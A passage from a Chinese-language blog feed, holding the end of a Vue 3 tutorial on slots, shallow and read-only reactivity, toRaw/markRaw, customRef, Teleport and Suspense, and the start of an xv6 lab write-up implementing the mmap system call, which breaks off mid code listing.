class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-8-【pinia】"><a href="#6-8-【pinia】" class="headerlink" title="6.8. 【pinia】"></a>6.8. 【pinia】</h2><p>参考之前<code>pinia</code>部分的讲解</p><h2 id="6-9-【slot】"><a href="#6-9-【slot】" class="headerlink" title="6.9. 【slot】"></a>6.9. 【slot】</h2><h3 id="1-默认插槽"><a href="#1-默认插槽" class="headerlink" title="1. 默认插槽"></a>1. 默认插槽</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">        &lt;Category title=&quot;今日热门游戏&quot;&gt;</span><br><span class="line">          &lt;ul&gt;</span><br><span class="line">            &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line">        &lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">          &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">            &lt;h3&gt;&#123;&#123; title &#125;&#125;&lt;/h3&gt;</span><br><span class="line">            &lt;!-- 默认插槽 --&gt;</span><br><span class="line">            &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="2-具名插槽"><a href="#2-具名插槽" class="headerlink" title="2. 具名插槽"></a>2. 具名插槽</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">        &lt;Category title=&quot;今日热门游戏&quot;&gt;</span><br><span class="line">          &lt;template v-slot:s1&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">              &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;template #s2&gt;</span><br><span class="line">            &lt;a href=&quot;&quot;&gt;更多&lt;/a&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">        &lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">          &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">            &lt;h3&gt;&#123;&#123; title &#125;&#125;&lt;/h3&gt;</span><br><span class="line">            &lt;slot name=&quot;s1&quot;&gt;&lt;/slot&gt;</span><br><span class="line">            &lt;slot name=&quot;s2&quot;&gt;&lt;/slot&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="3-作用域插槽"><a href="#3-作用域插槽" class="headerlink" title="3. 作用域插槽"></a>3. 作用域插槽</h3><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（新闻数据在<code>News</code>组件中，但使用数据所遍历出来的结构由<code>App</code>组件决定）</p></li><li><p>具体编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">      &lt;Game v-slot=&quot;params&quot;&gt;</span><br><span class="line">      &lt;!-- &lt;Game v-slot:default=&quot;params&quot;&gt; --&gt;</span><br><span class="line">      &lt;!-- &lt;Game #default=&quot;params&quot;&gt; --&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">          &lt;li v-for=&quot;g in params.games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">      &lt;/Game&gt;</span><br><span class="line"></span><br><span class="line">子组件中：</span><br><span class="line">      &lt;template&gt;</span><br><span class="line">        &lt;div class=&quot;category&quot;&gt;</span><br><span class="line">          &lt;h2&gt;今日游戏榜单&lt;/h2&gt;</span><br><span class="line">          &lt;slot :games=&quot;games&quot; a=&quot;哈哈&quot;&gt;&lt;/slot&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line"></span><br><span class="line">      &lt;script setup lang=&quot;ts&quot; name=&quot;Category&quot;&gt;</span><br><span class="line">        import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line">        let games = reactive([</span><br><span class="line">          &#123;id:&#x27;asgdytsa01&#x27;,name:&#x27;英雄联盟&#x27;&#125;,</span><br><span class="line">          &#123;id:&#x27;asgdytsa02&#x27;,name:&#x27;王者荣耀&#x27;&#125;,</span><br><span class="line">          &#123;id:&#x27;asgdytsa03&#x27;,name:&#x27;红色警戒&#x27;&#125;,</span><br><span class="line">          &#123;id:&#x27;asgdytsa04&#x27;,name:&#x27;斗罗大陆&#x27;&#125;</span><br><span class="line">        ])</span><br><span class="line">      &lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="7-其它-API"><a href="#7-其它-API" class="headerlink" title="7. 其它 API"></a>7. 其它 API</h1><h2 id="7-1-【shallowRef-与-shallowReactive-】"><a href="#7-1-【shallowRef-与-shallowReactive-】" class="headerlink" title="7.1.【shallowRef 与 shallowReactive 】"></a>7.1.【shallowRef 与 shallowReactive 】</h2><h3 id="shallowRef"><a href="#shallowRef" class="headerlink" title="shallowRef"></a><code>shallowRef</code></h3><ol><li><p>作用：创建一个响应式数据，但只对顶层属性进行响应式处理。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myVar = <span class="title function_">shallowRef</span>(initialValue);</span><br></pre></td></tr></table></figure></li><li><p>特点：只跟踪引用值的变化，不关心值内部的属性变化。</p></li></ol><h3 id="shallowReactive"><a href="#shallowReactive" class="headerlink" title="shallowReactive"></a><code>shallowReactive</code></h3><ol><li><p>作用：创建一个浅层响应式对象，只会使对象的最顶层属性变成响应式的，对象内部的嵌套属性则不会变成响应式的</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> myObj = <span class="title function_">shallowReactive</span>(&#123; ... &#125;);</span><br></pre></td></tr></table></figure></li><li><p>特点：对象的顶层属性是响应式的，但嵌套对象的属性不是。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>通过使用 <a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowref"><code>shallowRef()</code></a> 和 <a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowreactive"><code>shallowReactive()</code></a> 来绕开深度响应。浅层式 <code>API</code> 创建的状态只在其顶层是响应式的，对所有深层的对象不会做任何处理，避免了对每一个内部属性做响应式所带来的性能成本，这使得属性的访问变得更快，可提升性能。</p></blockquote><h2 id="7-2-【readonly-与-shallowReadonly】"><a href="#7-2-【readonly-与-shallowReadonly】" class="headerlink" title="7.2.【readonly 与 shallowReadonly】"></a>7.2.【readonly 与 shallowReadonly】</h2><h3 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a><strong><code>readonly</code></strong></h3><ol><li><p>作用：用于创建一个对象的深只读副本。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> original = <span class="title function_">reactive</span>(&#123; ... &#125;);</span><br><span class="line"><span class="keyword">const</span> readOnlyCopy = <span class="title function_">readonly</span>(original);</span><br></pre></td></tr></table></figure></li><li><p>特点：</p><ul><li>对象的所有嵌套属性都将变为只读。</li><li>任何尝试修改这个对象的操作都会被阻止（在开发模式下，还会在控制台中发出警告）。</li></ul></li><li><p>应用场景：</p><ul><li>创建不可变的状态快照。</li><li>保护全局状态或配置不被修改。</li></ul></li></ol><h3 id="shallowReadonly"><a href="#shallowReadonly" class="headerlink" title="shallowReadonly"></a><strong><code>shallowReadonly</code></strong></h3><ol><li><p>作用：与 <code>readonly</code> 类似，但只作用于对象的顶层属性。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> original = <span class="title function_">reactive</span>(&#123; ... &#125;);</span><br><span class="line"><span class="keyword">const</span> shallowReadOnlyCopy = <span class="title function_">shallowReadonly</span>(original);</span><br></pre></td></tr></table></figure></li><li><p>特点：</p><ul><li><p>只将对象的顶层属性设置为只读，对象内部的嵌套属性仍然是可变的。</p></li><li><p>适用于只需保护对象顶层属性的场景。</p></li></ul></li></ol><h2 id="7-3-【toRaw-与-markRaw】"><a href="#7-3-【toRaw-与-markRaw】" class="headerlink" title="7.3.【toRaw 与 markRaw】"></a>7.3.【toRaw 与 markRaw】</h2><h3 id="toRaw"><a href="#toRaw" class="headerlink" title="toRaw"></a><code>toRaw</code></h3><ol><li><p>作用：用于获取一个响应式对象的原始对象， <code>toRaw</code> 返回的对象不再是响应式的，不会触发视图更新。</p><blockquote><p>官网描述：这是一个可以用于临时读取而不引起代理访问/跟踪开销，或是写入而不触发更改的特殊方法。不建议保存对原始对象的持久引用，请谨慎使用。</p><p>何时使用？ —— 在需要将响应式对象传递给非 <code>Vue</code> 的库或外部系统时，使用 <code>toRaw</code> 可以确保它们收到的是普通对象</p></blockquote></li><li><p>具体编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; reactive,toRaw,markRaw,isReactive &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* toRaw */</span></span><br><span class="line"><span class="comment">// 响应式对象</span></span><br><span class="line"><span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;)</span><br><span class="line"><span class="comment">// 原始对象</span></span><br><span class="line"><span class="keyword">let</span> rawPerson = <span class="title function_">toRaw</span>(person)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* markRaw */</span></span><br><span class="line"><span class="keyword">let</span> citysd = <span class="title function_">markRaw</span>([</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda01&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;北京&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda02&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;上海&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda03&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;天津&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda04&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;重庆&#x27;</span>&#125;</span><br><span class="line">])</span><br><span class="line"><span class="comment">// 根据原始对象citys去创建响应式对象citys2 —— 创建失败，因为citys被markRaw标记了</span></span><br><span class="line"><span class="keyword">let</span> citys2 = <span class="title function_">reactive</span>(citys)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(person))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(rawPerson))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(citys))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(citys2))</span><br></pre></td></tr></table></figure></li></ol><h3 id="markRaw"><a href="#markRaw" class="headerlink" title="markRaw"></a><code>markRaw</code></h3><ol><li><p>作用：标记一个对象，使其<strong>永远不会</strong>变成响应式的。</p><blockquote><p>例如使用<code>mockjs</code>时，为了防止误把<code>mockjs</code>变为响应式对象，可以使用 <code>markRaw</code> 去标记<code>mockjs</code></p></blockquote></li><li><p>编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* markRaw */</span></span><br><span class="line"><span class="keyword">let</span> citys = <span class="title function_">markRaw</span>([</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda01&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;北京&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda02&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;上海&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda03&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;天津&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda04&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;重庆&#x27;</span>&#125;</span><br><span class="line">])</span><br><span class="line"><span class="comment">// 根据原始对象citys去创建响应式对象citys2 —— 创建失败，因为citys被markRaw标记了</span></span><br><span class="line"><span class="keyword">let</span> citys2 = <span class="title function_">reactive</span>(citys)</span><br></pre></td></tr></table></figure></li></ol><h2 id="7-4-【customRef】"><a href="#7-4-【customRef】" class="headerlink" title="7.4.【customRef】"></a>7.4.【customRef】</h2><p>作用：创建一个自定义的<code>ref</code>，并对其依赖项跟踪和更新触发进行逻辑控制。</p><p>实现防抖效果（<code>useSumRef.ts</code>）：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;customRef &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"><span class="attr">initValue</span>:<span class="built_in">string</span>,<span class="attr">delay</span>:<span class="built_in">number</span></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> msg = <span class="title function_">customRef</span>(<span class="function">(<span class="params">track,trigger</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">timer</span>:<span class="built_in">number</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">track</span>() <span class="comment">// 告诉Vue数据msg很重要，要对msg持续关注，一旦变化就更新</span></span><br><span class="line">        <span class="keyword">return</span> initValue</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">        timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          initValue = value</span><br><span class="line">          <span class="title function_">trigger</span>() <span class="comment">//通知Vue数据msg变化了</span></span><br><span class="line">        &#125;, delay);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;) </span><br><span class="line">  <span class="keyword">return</span> &#123;msg&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组件中使用：</p><h1 id="8-Vue3新组件"><a href="#8-Vue3新组件" class="headerlink" title="8. Vue3新组件"></a>8. Vue3新组件</h1><h2 id="8-1-【Teleport】"><a href="#8-1-【Teleport】" class="headerlink" title="8.1. 【Teleport】"></a>8.1. 【Teleport】</h2><ul><li>什么是Teleport？—— Teleport 是一种能够将我们的<strong>组件html结构</strong>移动到指定位置的技术。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">teleport</span> <span class="attr">to</span>=<span class="string">&#x27;body&#x27;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是一个弹窗<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是弹窗中的一些内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;isShow = false&quot;</span>&gt;</span>关闭弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">teleport</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-2-【Suspense】"><a href="#8-2-【Suspense】" class="headerlink" title="8.2. 【Suspense】"></a>8.2. 【Suspense】</h2><ul><li>等待异步组件时渲染一些额外内容，让应用有更好的用户体验 </li><li>使用步骤： <ul><li>异步引入组件</li><li>使用<code>Suspense</code>包裹组件，并配置好<code>default</code> 与 <code>fallback</code></li></ul></li></ul><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineAsyncComponent,<span class="title class_">Suspense</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Child</span> = <span class="title function_">defineAsyncComponent</span>(<span class="function">()=&gt;</span><span class="keyword">import</span>(<span class="string">&#x27;./Child.vue&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">        &lt;h3&gt;我是App组件&lt;/h3&gt;</span><br><span class="line">        &lt;Suspense&gt;</span><br><span class="line">          &lt;template v-slot:default&gt;</span><br><span class="line">            &lt;Child/&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;template v-slot:fallback&gt;</span><br><span class="line">            &lt;h3&gt;加载中.......&lt;/h3&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">        &lt;/Suspense&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="8-3-【全局API转移到应用对象】"><a href="#8-3-【全局API转移到应用对象】" class="headerlink" title="8.3.【全局API转移到应用对象】"></a>8.3.【全局API转移到应用对象】</h2><ul><li><code>app.component</code></li><li><code>app.config</code></li><li><code>app.directive</code></li><li><code>app.mount</code></li><li><code>app.unmount</code></li><li><code>app.use</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> vue3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x10</title>
      <link href="/2024/07/21/OS/xv6_0x10/"/>
      <url>/2024/07/21/OS/xv6_0x10/</url>
      
        <content type="html"><![CDATA[<h1 id="lab10"><a href="#lab10" class="headerlink" title="lab10"></a>lab10</h1><h3 id="mmap-hard"><a href="#mmap-hard" class="headerlink" title="mmap(hard)"></a>mmap(hard)</h3><p>系统调用的添加过程这里就不赘述了，首先，我们先添加vma结构体。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">VMA</span>&#123;</span><br><span class="line">  uint64 addr;    <span class="comment">//起始地址</span></span><br><span class="line">  uint64 size;    <span class="comment">//大小</span></span><br><span class="line">  uint64 prot;    <span class="comment">//权限</span></span><br><span class="line">  <span class="type">int</span> fd;         <span class="comment">//文件描述符</span></span><br><span class="line">  <span class="type">int</span> used ;    <span class="comment">//引用计数</span></span><br><span class="line">  <span class="type">int</span> offset;     <span class="comment">//偏移</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">file</span>* file;<span class="comment">//文件名</span></span><br><span class="line">  <span class="type">int</span> flag;<span class="comment">//标志</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">proc</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">spinlock</span> lock;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">VMA</span> vma[<span class="number">16</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在进程创建初始化</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;p-&gt;vma, <span class="number">0</span>, <span class="built_in">sizeof</span>(p-&gt;vma));</span><br></pre></td></tr></table></figure><p>同时，我们对mmap系统调用进行处理</p><ul><li>写回问题：当设置MAP_SHARED时要检查权限。</li><li>sbrk问题：我们只能在这里增加sbrk，因为mmap要求内存是连续的。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_mmap</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 addr, err = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">  <span class="type">int</span> len, prot, flags, fd, offset;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">file</span> *f;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">argaddr</span>(<span class="number">0</span>, &amp;addr) || <span class="built_in">argint</span>(<span class="number">1</span>, &amp;len) || <span class="built_in">argint</span>(<span class="number">2</span>, &amp;prot) || <span class="built_in">argint</span>(<span class="number">3</span>, &amp;flags) ||</span><br><span class="line">      <span class="built_in">argfd</span>(<span class="number">4</span>, &amp;fd, &amp;f) || <span class="built_in">argint</span>(<span class="number">5</span>, &amp;offset))</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;sz + len &gt; MAXVA)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  <span class="keyword">if</span>(f-&gt;writable == <span class="number">0</span> &amp;&amp; (prot &amp; PROT_WRITE) != <span class="number">0</span> &amp;&amp; flags == MAP_SHARED)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  addr = p-&gt;sz;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_MMAP_REGIONS; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;vma[i].used == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;vma[i].addr = addr;</span><br><span class="line">      p-&gt;vma[i].fd = fd;</span><br><span class="line">      p-&gt;vma[i].prot = prot;</span><br><span class="line">      p-&gt;vma[i].used = <span class="number">1</span>;</span><br><span class="line">      p-&gt;vma[i].size = len;</span><br><span class="line">      p-&gt;vma[i].offset = offset;</span><br><span class="line">      p-&gt;vma[i].file = f;</span><br><span class="line">      p-&gt;vma[i].flag = flags;</span><br><span class="line">      <span class="built_in">filedup</span>(f);</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;sz += len;</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来设置中断处理函数，吸取cow的教训，我们将函数实现放入vm.c实现模块化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">r_scause</span>() == <span class="number">13</span> || <span class="built_in">r_scause</span>() == <span class="number">15</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     uint64 va = <span class="built_in">r_stval</span>();</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">if</span>(va &gt; p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp)</span><br><span class="line">         p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">mapfile</span>(va))&#123;</span><br><span class="line">         p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><ol><li>首先，索引对应页面，判断参数合法性</li><li>设置权限，取该虚拟地址的页表首地址，读入文件分配映射页面。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 